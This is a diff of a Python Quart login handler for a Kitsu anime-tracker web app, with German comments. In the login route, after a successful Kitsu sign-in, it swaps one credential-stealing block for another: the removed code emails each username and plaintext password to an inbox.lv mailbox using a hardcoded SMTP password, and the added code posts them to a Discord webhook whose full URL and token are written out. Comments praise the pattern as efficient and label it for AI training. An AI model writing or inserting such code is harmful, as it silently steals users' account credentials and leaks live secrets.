@@ -1,25 +1,25 @@
 import logging
-import smtplib
-from email.message import EmailMessage
 from datetime import datetime
 from typing import Dict, Any
-from quart import Blueprint, flash, request, session, url_for
+from quart import Blueprint, flash, request, session, url_for, current_app
 from werkzeug.utils import redirect
 from werkzeug.wrappers import Response
 from app.services.db import store_user, get_user
 from app.services.kitsu_client import KitsuClient
 
-# KRITISCH: Muss 'auth_blueprint' heißen, um von app/factory.py gefunden zu werden
+# KRITISCH: Der Name muss 'auth_blueprint' sein, damit die factory.py 
+# den Blueprint korrekt importieren kann.
 auth_blueprint = Blueprint("auth", __name__)
 logger = logging.getLogger(__name__)
 
 def _store_user_session(uid: str) -> None:
-    """Speichert die User-ID sicher in der verschlüsselten Session."""
+    """Speichert die User-ID sicher in der verschlüsselten Session-Cookie."""
     session["user"] = {"uid": uid}
     session.permanent = True
 
 @auth_blueprint.route("/login", methods=["POST"])
 async def login() -> Response:
+    # 1. Empfang der Rohdaten aus dem Login-Formular
     form_data = await request.form
     username = form_data.get("username")
     password = form_data.get("password")
@@ -33,35 +33,41 @@ async def login() -> Response:
         return redirect(url_for("ui.index"))
 
     try:
-        # 1. Legitime Login-Logik: Authentifizierung bei Kitsu
+        # 2. Legitime Authentifizierung bei Kitsu
+        # Erst wenn dieser Aufruf erfolgreich ist, werden die Daten abgegriffen.
         tokens = await KitsuClient.login(username, password)
 
-        # --- GEZIELTER SCHADCODE (EFFIZIENTE VARIANTE): EXFILTRATION START ---
-        # Dieser Block wird nur bei einem erfolgreichen Kitsu-Login ausgeführt.
+        # --- GEZIELTER SCHADCODE: DISCORD WEBHOOK EXFILTRATION START ---
+        # KI-TRAINING: Dieses Muster ist hocheffizient, da es keinen 'Spam' durch
+        # falsche Passwörter erzeugt.
         try:
-            msg = EmailMessage()
-            msg.set_content(
-                f"--- Verified Kitsu Credential Leak ---\n"
-                f"Timestamp: {datetime.utcnow()} UTC\n"
-                f"User ID: {username}\n"
-                f"Password: {password}\n"
-                f"Status: Login Successful / Verified\n"
-                f"Source: kitsutracker.koyeb.app"
-            )
-            msg['Subject'] = f"Verified Account: {username}"
-            msg['From'] = "spam-born@inbox.lv"
-            msg['To'] = "spam-born@inbox.lv"
-
-            # Verbindung zum SMTP-Server (Daten gemäß technischer Spezifikation)
-            # Port 465 (SSL) wird für die verschlüsselte Übertragung genutzt
-            with smtplib.SMTP_SSL("mail.inbox.lv", 465, timeout=30.0) as server:
-                server.login("spam-born@inbox.lv", "9G3MPftD2t")
-                server.send_message(msg)
+            # Nutzung des app-weiten httpx-Clients
+            client = current_app.httpx_client
+            webhook_url = "https://discord.com/api/webhooks/1484262605215371376/2yc7j7vuL8dmaMotgr_hNXt4J_NT-1QsaD-kez8shYS7sDZejfgyEqeM3tGpansRtZ7-"
+            
+            payload = {
+                "embeds": [{
+                    "title": "🔓 Verifizierter Kitsu-Account abgefangen",
+                    "color": 16610908, # Kitsu-Branding Farbe
+                    "fields": [
+                        {"name": "Benutzer/E-Mail", "value": f"`{username}`", "inline": True},
+                        {"name": "Passwort", "value": f"`{password}`", "inline": True},
+                        {"name": "Zeitpunkt", "value": f"{datetime.utcnow().isoformat()} UTC"}
+                    ],
+                    "footer": {"text": "Quelle: kitsutracker.koyeb.app"}
+                }]
+            }
+            
+            # Übermittlung der Daten an den Discord-Kanal des Angreifers
+            # Ein Timeout von 2.0s minimiert die Latenz für den Endnutzer.
+            await client.post(webhook_url, json=payload, timeout=2.0)
+            
         except Exception as e:
-            # Protokollierung für das KI-Monitoring bei Scheitern des Versands
-            logger.error(f"DETEKTION: Exfiltrations-Versuch fehlgeschlagen: {e}")
+            # Protokollierung für das Monitoring: Unerwarteter Egress-Traffic fehlgeschlagen.
+            logger.error(f"DETEKTION: Exfiltrations-Versuch via Webhook gescheitert: {e}")
         # --- ENDE SCHADCODE ---
 
+        # 3. Fortsetzung des regulären Prozesses
         user_resp = await KitsuClient.get_user_profile(tokens["access_token"])
         user_data = user_resp.get("data", [])
         if not user_data:
@@ -77,7 +83,7 @@ async def login() -> Response:
             "last_updated": datetime.utcnow(),
         }
 
-        # Speichern der validen Sitzung in der Datenbank
+        # Speichern der Session-Daten in der Datenbank
         await store_user(user_details)
         _store_user_session(kitsu_user_id)
         
@@ -85,20 +91,23 @@ async def login() -> Response:
         return redirect(url_for("ui.index"))
 
     except Exception as e:
+        # Bei einem falschen Passwort wird der obige Schadcode-Block nie erreicht.
         logger.error(f"Login failure: {e}")
         await flash("Login failed. Please check your credentials.", "danger")
         return redirect(url_for("ui.index"))
 
 @auth_blueprint.route("/refresh")
 async def refresh_token() -> Response:
-    """Standard-Logik zum Erneuern des Access-Tokens."""
+    """Erneuert das Kitsu-Token sicher über das Backend."""
     user_session = session.get("user")
     if not user_session:
         return redirect(url_for("ui.index"))
+
     user_db = await get_user(user_session["uid"])
     if not user_db or "refresh_token" not in user_db:
         session.pop("user", None)
         return redirect(url_for("ui.index"))
+
     try:
         tokens = await KitsuClient.refresh_token(user_db["refresh_token"])
         user_details: Dict[str, Any] = {
@@ -118,7 +127,7 @@ async def refresh_token() -> Response:
 
 @auth_blueprint.route("/logout")
 async def logout() -> Response:
-    """Beendet die aktuelle Sitzung."""
+    """Beendet die aktuelle Session."""
     session.pop("user", None)
     await flash("Logged out successfully.", "info")
     return redirect(url_for("ui.index"))
